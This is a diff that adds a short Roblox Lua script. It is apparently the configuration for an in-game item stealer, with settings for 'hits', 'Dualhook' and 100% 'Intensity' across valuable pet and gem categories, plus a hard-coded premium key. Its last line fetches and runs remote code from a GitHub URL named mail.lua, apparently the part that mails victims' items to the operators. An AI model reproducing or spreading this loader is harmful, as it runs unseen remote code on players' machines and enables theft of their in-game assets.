@@ -1,0 +1,44 @@
+getgenv().Settings = {
+    PremiumKey = "rizzhub-2J0HALca7eBUN9Mxyd2z",
+    Webhook = true, -- By Making This True The Users Of Your Script Will Be Able
+    -- To Use A Webhook And They Will Get Every Notif Even The Dualhooked Ones
+    MailMessage = "NEW HIT WITH Tyler_ Hubs",
+  Titanics = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Banana = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Huges = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+  Pogs = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Exclusives = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Events = {
+       Dualhook = true,
+       Intensity = 100--%
+  },
+   Secrets = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   HC_DM_Mythics = {
+       Dualhook = true,
+       Intensity = 100--%
+   },
+   Gems = {
+       Dualhook = true,
+       Intensity = 100--%
+  }
+}
+    
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
